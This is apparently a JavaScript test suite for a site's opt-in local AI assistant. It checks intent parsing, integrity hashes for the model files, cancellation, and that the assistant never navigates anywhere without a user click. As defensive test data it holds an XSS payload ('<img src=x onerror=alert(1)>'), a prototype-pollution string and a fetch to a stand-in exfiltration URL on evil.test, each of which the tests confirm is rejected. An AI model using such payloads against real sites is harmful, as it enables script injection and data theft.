'use strict';
// VM tests cover policy, resource integrity and lifecycle. They do not claim browser/device inference.
const assert=require('node:assert/strict'),fs=require('node:fs'),vm=require('node:vm'),crypto=require('node:crypto');
const root=require('node:path').resolve(__dirname,'..');
const policy=require(root+'/dist/local-ai-policy.js');
assert.equal(policy.parse('{"intent":"cabinet"}').intent,'cabinet');
for(const raw of ['{"intent":"transfer"}','{"intent":"cabinet","amount":100}', '```json\n{"intent":"cabinet"}\n```','<img src=x onerror=alert(1)>','null','[]','{"__proto__":{"intent":"cabinet"}}'])assert.equal(policy.parse(raw),null);
for(const intent of ['help','sell','unsupported'])assert.equal(policy.proposal(JSON.stringify({intent}),'query').command,undefined);
assert.equal(policy.proposal('{"intent":"search"}','красный пикап до 200 тысяч километров').command,'Найди красный пикап до 200 тысяч километров');
assert.match(policy.proposal('{"intent":"help"}','Оплата').text,/не подключены/);
assert.equal(policy.proposal('{"intent":"search"}','Найди красный пикап').command,'Найди красный пикап');
assert.equal(policy.proposal('{"intent":"search"}','Хочу купить красный пикап').command,'Хочу купить красный пикап');
assert.equal(policy.proposal('{"intent":"search"}','x'.repeat(451)).kind,'help');
const engine=fs.readFileSync(root+'/dist/vendor/transformers-2.17.2.min.js');
assert.equal(crypto.createHash('sha256').update(engine).digest('hex'),'bcf7cf304e51f470ed59409622b9d6ffbad80dfcf5baf6a40c919e4b9c4ff812');
const prototypes=JSON.parse(fs.readFileSync(root+'/dist/local-ai-prototypes.json'));
assert.equal(prototypes.rows.length,40);assert.equal(prototypes.threshold,.5);assert.equal(prototypes.margin,.08);
for(const row of prototypes.rows){assert(policy.intents.includes(row.intent));assert.equal(row.vector.length,384);assert(Math.abs(row.vector.reduce((sum,x)=>sum+x*x,0)-1)<1e-5)}
function boot({supported=true}={}){
 const nodes=new Map(),events={},windowEvents={},workers=[],executed=[],records=new Map();let cacheDeleted=[],paused=0,micStopped=0,cancelled=0;
 class Node{constructor(tag){this.tagName=tag;this.textContent='';this.children=[];this.disabled=false;this.value='';this.open=false;this.attributes={};this.listeners={};this.classList={toggle(){},add(){},remove(){}}}set innerHTML(value){this.html=value;for(const match of value.matchAll(/id="([^"]+)"/g))nodes.set('#'+match[1],new Node('element'))}querySelector(selector){return nodes.get(selector)||null}setAttribute(key,value){this.attributes[key]=value}appendChild(node){this.children.push(node);return node}replaceChildren(){this.children=[]}addEventListener(type,listener){this.listeners[type]=listener}showModal(){this.open=true}close(){this.open=false;this.listeners.close?.()}}
 const document={hidden:false,body:new Node('body'),querySelector(selector){return nodes.get(selector)||null},querySelectorAll(selector){return selector==='dialog[open]'?this.body.children.filter(node=>node.tagName==='dialog'&&node.open):[]},createElement(tag){return new Node(tag)},addEventListener(type,handler){events[type]=handler}};
 class Worker{constructor(url,options){this.url=url;this.options=options;this.messages=[];this.terminated=false;workers.push(this)}postMessage(message){this.messages.push(message)}terminate(){this.terminated=true}send(message){this.onmessage?.({data:message})}}
 const caches={async open(name){return{async keys(){return[...records].map(([url])=>({url}))},async delete(req){const url=typeof req==='string'?req:req.url;cacheDeleted.push([name,url]);records.delete(url);return true}}}};
 const window={isSecureContext:supported,crypto:crypto.webcrypto,FasLocalAIPolicy:policy,FasAssistantPreferences:{pauseSpeech(){paused++}},speechSynthesis:{cancel(){cancelled++}},FasVoiceAssistant:{open(){},stop(){micStopped++},parse(command){if(command.startsWith('Найди '))return{action:'search'};return{action:command==='Открой личный кабинет'?'cabinet':command==='Открой избранное'?'favorites':command==='Открой мои ставки'?'my_bids':'unsupported'}},execute(command){executed.push(command);return{ok:true}}},addEventListener(type,fn){windowEvents[type]=fn}};
 const context={window,document,navigator:{storage:{async estimate(){return{quota:1e9,usage:0}}}},Worker,WebAssembly,crypto:crypto.webcrypto,caches,setTimeout,clearTimeout,console};context.globalThis=context;
 vm.runInNewContext(fs.readFileSync(root+'/dist/local-ai.js','utf8'),context,{filename:'local-ai.js'});
 const originalAppend=document.body.appendChild.bind(document.body);document.body.appendChild=node=>{if(node.tagName==='dialog'){const close=new Node('button');nodes.set('[data-local-ai-close]',close)}return originalAppend(node)};
 return{api:window.FasLocalAI,nodes,workers,events,windowEvents,executed,document,records,get deleted(){return cacheDeleted},get paused(){return paused},get micStopped(){return micStopped},get cancelled(){return cancelled}};
}
async function tick(){await Promise.resolve();await Promise.resolve()}
async function ready(h){h.api.open();await h.api.enable();const worker=h.workers.at(-1),generation=worker.messages[0].generation;worker.send({type:'ready',generation});assert.equal(h.api.state().ready,true);return{worker,generation}}
(async()=>{
 let h=boot();assert.equal(h.workers.length,0,'page startup does not create a worker');h.api.open();assert.equal(h.workers.length,0,'opening explains download without starting it');
 h.nodes.set('#voice-command',{value:'Найди красный пикап'});h.nodes.set('#voice-dialog',{open:true});h.api.open();assert.equal(h.nodes.get('#local-ai-query').value,'','programmatic open does not copy voice text');h.api.open({prefill:true});assert.equal(h.nodes.get('#local-ai-query').value,'Найди красный пикап');assert(h.micStopped>0&&h.paused>0&&h.cancelled>0,'explicit local panel stops ASR and pauses assistant speech');
 h=boot({supported:false});h.api.open();assert.equal((await h.api.enable()).reason,'unsupported');assert.equal(h.workers.length,0);
 h=boot();let {worker,generation}=await ready(h);h.nodes.get('#local-ai-query').value='Где мой профиль?';let promise=h.api.ask('Где мой профиль?');let id=worker.messages.at(-1).id;
 worker.send({type:'result',generation,id,raw:'{"intent":"cabinet"}'});await promise;assert.equal(h.executed.length,0,'model output never executes a route');
 const result=h.nodes.get('#local-ai-result');assert(result.children.every(node=>!node.html),'model and user output remain text');result.children.at(-1).onclick();assert.deepEqual(h.executed,['Открой личный кабинет']);assert(worker.terminated);
 h=boot();({worker,generation}=await ready(h));promise=h.api.ask('Где мой профиль?');id=worker.messages.at(-1).id;worker.send({type:'result',generation,id,raw:'{"intent":"cabinet"}'});await promise;h.nodes.get('#local-ai-query').value='не открывай кабинет';h.nodes.get('#local-ai-result').children.at(-1).onclick();assert.equal(h.executed.length,0,'editing a route proposal invalidates it too');h.api.stop();
 h=boot();({worker,generation}=await ready(h));h.nodes.get('#local-ai-query').value='<img src=x onerror=alert(1)>';promise=h.api.ask(h.nodes.get('#local-ai-query').value);id=worker.messages.at(-1).id;worker.send({type:'result',generation,id,raw:'{"intent":"search"}'});await promise;assert.equal(h.nodes.get('#local-ai-result').children[1].textContent,'<img src=x onerror=alert(1)>');assert.equal(h.executed.length,0);
 h.nodes.get('#local-ai-query').value='другой запрос';h.nodes.get('#local-ai-result').children.at(-1).onclick();assert.equal(h.executed.length,0,'editing the proposed search invalidates its action');h.api.stop();
 h=boot();({worker,generation}=await ready(h));const count=worker.messages.length;await h.api.ask('Сотри мой профиль прямо сейчас');assert.equal(worker.messages.length,count,'destructive intent is handled by site rules before neural inference');assert.equal(h.executed.length,0);assert.match(h.nodes.get('#local-ai-result').children[1].textContent,/не подключены/);
 promise=h.api.ask('покажи сохранённое');h.api.close();assert(worker.terminated);assert.equal((await promise).reason,'cancelled');worker.send({type:'result',generation,id:worker.messages.at(-1).id,raw:'{"intent":"cabinet"}'});assert.equal(h.api.state().ready,false);assert.equal(h.executed.length,0);
 h=boot();({worker,generation}=await ready(h));promise=h.api.ask('найди машину');h.document.hidden=true;h.events.visibilitychange();assert(worker.terminated);await promise;assert.equal(h.api.state().phase,'off');
 h=boot();({worker,generation}=await ready(h));h.nodes.get('#local-ai-query').value='запрос профиля A';h.windowEvents['fas-assistant-personalization-change']({detail:{profileChanged:true}});assert(worker.terminated);assert.equal(h.nodes.get('#local-ai-query').value,'');
 h.records.set('https://huggingface.co/model.bin',true);await h.api.clearCache();assert(h.deleted.every(([name])=>name==='fas-local-ai-artifacts-v1'),'clear never deletes profile/form caches');
 const posted=[],nativeRequests=[];let wc;
 const fetch=async(url,options)=>{nativeRequests.push({url,options});return new Response('wrong')};
 wc={FasLocalAIPolicy:policy,location:{href:'https://site.test/local-ai-worker.js',hostname:'site.test',origin:'https://site.test'},fetch,Request,Response,URL,Blob,crypto:crypto.webcrypto,WebAssembly,Uint8Array,Map,Set,Promise,Number,JSON,postMessage:value=>posted.push(value)};wc.self=wc;wc.globalThis=wc;
 const source=fs.readFileSync(root+'/dist/local-ai-worker.js','utf8').replace("import './local-ai-policy.js';",'')+'\nself.testPolicy={FILES,verify,classify,setAnchors:value=>anchors=value};';vm.runInNewContext(source,wc,{filename:'local-ai-worker.js'});
 assert.equal(nativeRequests.length,0,'worker source evaluation never downloads');
 await assert.rejects(wc.fetch('https://evil.test/collect?q=secret'),/resource-policy/);const known=[...wc.testPolicy.FILES.keys()][0];await assert.rejects(wc.fetch(known,{method:'POST',body:'secret'}),/request-policy/);assert.equal(nativeRequests.length,0);
 for(const [url,file]of wc.testPolicy.FILES){assert.match(file.sha256,/^[a-f0-9]{64}$/);assert(file.bytes<120e6);assert(!url.includes('/main/'));}
 await assert.rejects(wc.fetch(known),/length/);assert.equal(nativeRequests.at(-1).options.credentials,'same-origin');const external=[...wc.testPolicy.FILES.keys()].find(url=>url.startsWith('https://cdn.jsdelivr.net/'));await assert.rejects(wc.fetch(external),/length/);assert.equal(nativeRequests.at(-1).options.credentials,'omit');assert.equal(nativeRequests.at(-1).options.referrerPolicy,'no-referrer');
 const bytes=Buffer.from('verified'),hash=crypto.createHash('sha256').update(bytes).digest('hex');await wc.testPolicy.verify(bytes,{bytes:bytes.length,sha256:hash});await assert.rejects(wc.testPolicy.verify(bytes,{bytes:bytes.length,sha256:'0'.repeat(64)}),/integrity/);
 wc.testPolicy.setAnchors({threshold:.5,margin:.08,rows:[{intent:'cabinet',vector:[1,0]},{intent:'favorites',vector:[0,1]}]});assert.equal(wc.testPolicy.classify([1,0]),'cabinet');assert.equal(wc.testPolicy.classify([.7,.69]),'unsupported');assert.equal(wc.testPolicy.classify([.2,.1]),'unsupported');
 console.log('PASS: local neural model opt-in, strict intent/URL policy, engine/model integrity, no auto actions, cancellation/profile/visibility guards, bounded review, confidence abstention and isolated cache removal. Browser inference not covered.');
})().catch(error=>{console.error(error);process.exitCode=1});
